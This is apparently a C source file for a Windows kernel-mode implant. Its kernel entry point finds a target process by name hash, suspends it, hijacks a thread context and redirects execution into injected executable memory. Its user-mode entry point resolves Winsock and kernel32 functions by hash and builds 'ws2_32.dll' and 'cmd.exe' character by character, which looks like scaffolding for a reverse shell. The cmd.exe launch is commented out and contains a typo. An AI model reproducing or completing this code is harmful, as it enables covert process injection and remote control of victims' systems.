
#include "common.h"

KENTRY void KmEntryPoint( VOID )
{
	PCONTEXT   ctx;
	NTSTATUS   ret;
	PVOID      mem;
	PVOID      ent;
	PVOID      ntp;
	PVOID      prc;
	PVOID      thd;
	ULONG_PTR  len;
	KAPC_STATE apc;
	KM_API     api;

	if ( (ntp = PcrGetModule( H_NTOSKRNL )) != NULL )
	{
		api.PsResumeProcess            = PeGetFuncEat( ntp, H_PSRESUMEPROCESS );
		api.PsSuspendProcess           = PeGetFuncEat( ntp, H_PSSUSPENDPROCESS );
		api.IoThreadToProcess          = PeGetFuncEat( ntp, H_IOTHREADTOPROCESS );
		api.PsSetContextThread         = PeGetFuncEat( ntp, H_PSSETCONTEXTTHREAD );
		api.PsGetContextThread         = PeGetFuncEat( ntp, H_PSGETCONTEXTTHREAD );
		api.ZwFreeVirtualMemory        = PeGetFuncEat( ntp, H_ZWFREEVIRTUALMEMORY );
		api.ObDereferenceObject        = PeGetFuncEat( ntp, H_OBDEREFERENCEOBJECT );
		api.KeStackAttachProcess       = PeGetFuncEat( ntp, H_KESTACKATTACHPROCESS );
		api.KeUnstackDetachProcess     = PeGetFuncEat( ntp, H_KEUNSTACKDETACHPROCESS );
		api.ZwAllocateVirtualMemory    = PeGetFuncEat( ntp, H_ZWALLOCATEVIRTUALMEMORY );
		api.PsLookupThreadByThreadId   = PeGetFuncEat( ntp, H_PSLOOKUPTHREADBYTHREADID );
		api.PsGetProcessImageFileName  = PeGetFuncEat( ntp, H_PSGETPROCESSIMAGEFILENAME );
		api.PsLookupProcessByProcessId = PeGetFuncEat( ntp, H_PSLOOKUPPROCESSBYPROCESSID );

		if ( (prc = ProcEnumProcess( &api, 0x5e3a79e0 )) != NULL )
		{
			api.KeStackAttachProcess( prc, &apc );
			
			if ( ! (ret = api.PsSuspendProcess( prc ))  )
			{
				if ( (thd = ProcEnumThreads( &api, prc )) != NULL )
				{
					if ( (ctx = ProcGetThreadCtx( &api, thd )) != NULL )
					{
						ent = CPTR( &EnterUmMode );
						len = UPTR( &LeaveUmMode ) - UPTR( &EnterUmMode );

						if ( (mem = ProcAllocateMem( &api, len, PAGE_EXECUTE_READWRITE )) != NULL )
						{
							__builtin_memcpy( mem, ent, len );

						#if defined(_WIN64)
							ctx->Rip = UPTR( mem );
							ctx->ContextFlags = CONTEXT_FULL;
						#else
							ctx->Eip = UPTR( mem );
							ctx->ContextFlags = CONTEXT_FULL;
						#endif

							ProcSetThreadCtx( &api, thd, ctx );
						};
					};
				};
				api.PsResumeProcess( prc );
			};

			api.KeUnstackDetachProcess( &apc );
		};
	};
};

UENTRY void UmEntryPoint( IN PCHAR Str )
{
	CHAR                lib[20];
	CHAR                prc[16];
	BOOL                ret;
	BOOL                rem;
	PVOID               k32;
	PVOID               ws2;
	STARTUPINFOA        sta;
	PROCESS_INFORMATION inf;
	UM_API              api;

	ws2 = PebGetModule( H_WS2_32 );
	k32 = PebGetModule( H_KERNEL32 );

	if ( k32 || ws2 )
	{
		api.CloseHandle    = PeGetFuncEat( k32, H_CLOSEHANDLE );
		api.FreeLibrary    = PeGetFuncEat( k32, H_FREELIBRARY );
		api.LoadLibraryA   = PeGetFuncEat( k32, H_LOADLIBRARYA );
		api.CreateProcessA = PeGetFuncEat( k32, H_CREATEPROCESSA );

		if ( ! ws2 )
		{
			lib[0]  = 'w';
			lib[1]  = 's';
			lib[2]  = '2';
			lib[3]  = '_';
			lib[4]  = '3';
			lib[5]  = '2';
			lib[6]  = '.';
			lib[7]  = 'd';
			lib[8]  = 'l';
			lib[9]  = 'l';
			lib[10] = '\0';

			rem = TRUE;
			ws2 = api.LoadLibraryA( CPTR(lib) );
		} else {
			rem = FALSE;
		};

		api.WSASocket   = PeGetFuncEat( ws2, H_WSASOCKET );
		api.WSAConnect  = PeGetFuncEat( ws2, H_WSACONNECT );
		api.WSAStartup  = PeGetFuncEat( ws2, H_WSASTARTUP );
		api.WSACleanup  = PeGetFuncEat( ws2, H_WSACLEANUP );
		api.closesocket = PeGetFuncEat( ws2, H_CLOSESOCKET );

		/*!
		RtlSecureZeroMemory(&inf, sizeof(inf));
		RtlSecureZeroMemory(&sta, sizeof(inf));

		prc[0] = 'c';
		prc[1] = 'm';
		prc[2] = 'd';
		prc[3] = '.';
		prc[4] = 'e';
		prc[5] = 'x';
		prc[6] = 'e';
		rpc[7] = '\0';

		sta.cb = sizeof(STARTUPINFOA);

		ret = api.CreateProcessA( NULL,
				          CPTR(prc),
					  NULL,
					  NULL,
					  TRUE,
					  0,
					  NULL,
					  NULL,
					  &sta,
					  &inf );
					  */

		if ( rem )
			api.FreeLibrary( ws2 );
	};
};
